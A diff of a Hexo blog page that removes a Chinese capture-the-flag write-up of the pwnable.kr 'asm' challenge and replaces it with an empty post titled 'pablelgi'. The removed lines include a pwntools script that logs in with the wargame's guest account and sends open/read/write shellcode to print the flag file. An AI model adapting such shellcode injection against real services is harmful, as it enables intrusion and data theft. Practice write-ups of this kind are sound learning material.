@@ -3,19 +3,15 @@
 <head>
   <meta charset="utf-8">
   
-  <title>pwnable.kr之asm | Hexo</title>
+  <title>pablelgi | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练  123456789101112131415from pwn import *con = ssh(host=&apos;pwnable.kr&apos;, user=&apos;asm&apos;, password=&apos;guest&apos;, port=2222)p = con.connect_remote(&apos;localhost">
-<meta name="keywords" content="shellcode,pwnable.kr,pwntools">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr之asm">
-<meta property="og:url" content="http://yoursite.com/2017/09/29/asmlong/index.html">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="pablelgi">
+<meta property="og:url" content="http://yoursite.com/2017/09/30/pablelgi/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练  123456789101112131415from pwn import *con = ssh(host=&apos;pwnable.kr&apos;, user=&apos;asm&apos;, password=&apos;guest&apos;, port=2222)p = con.connect_remote(&apos;localhost">
-<meta property="og:updated_time" content="2017-09-29T08:18:00.690Z">
+<meta property="og:updated_time" content="2017-09-30T03:33:22.160Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr之asm">
-<meta name="twitter:description" content="这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练  123456789101112131415from pwn import *con = ssh(host=&apos;pwnable.kr&apos;, user=&apos;asm&apos;, password=&apos;guest&apos;, port=2222)p = con.connect_remote(&apos;localhost">
+<meta name="twitter:title" content="pablelgi">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -64,10 +60,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-asmlong" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-pablelgi" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/09/29/asmlong/" class="article-date">
-  <time datetime="2017-09-29T08:12:29.000Z" itemprop="datePublished">2017-09-29</time>
+    <a href="/2017/09/30/pablelgi/" class="article-date">
+  <time datetime="2017-09-30T03:33:22.000Z" itemprop="datePublished">2017-09-30</time>
 </a>
     
   </div>
@@ -78,7 +74,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      pwnable.kr之asm
+      pablelgi
     </h1>
   
 
@@ -86,39 +82,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">con = ssh(host=<span class="string">'pwnable.kr'</span>, user=<span class="string">'asm'</span>, password=<span class="string">'guest'</span>, port=<span class="number">2222</span>)</div><div class="line">p = con.connect_remote(<span class="string">'localhost'</span>, <span class="number">9026</span>)</div><div class="line"></div><div class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</div><div class="line">shellcode = <span class="string">""</span></div><div class="line">shellcode += shellcraft.pushstr(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</div><div class="line">shellcode += shellcraft.open(<span class="string">'rsp'</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</div><div class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'shellcode: '</span>)</div><div class="line">p.send(asm(shellcode))</div><div class="line"><span class="keyword">print</span> p.recvline()</div></pre></td></tr></table></figure>
-<p>所有的系统调用都可以直接生产, ssh也可以连过去, 另外需要注意的就是context很重要.</p>
-
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/09/29/asmlong/" data-id="cj86rj00b000dgo99nmzqcy58" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/09/30/pablelgi/" data-id="cj86rj016000sgo99ccxh15mj" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwntools/">pwntools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/">shellcode</a></li></ul>
-
     </footer>
   </div>
   
     
 <nav id="article-nav">
   
-    <a href="/2017/09/29/memcpy/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          pwnable.kr之memcpy
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/09/28/csaw2017-cvv/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2017/09/29/memcpy/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">CSAW 2017 CVV及tabIEZ writeup</div>
+      <div class="article-nav-title">pwnable.kr之memcpy</div>
     </a>
   
 </nav>
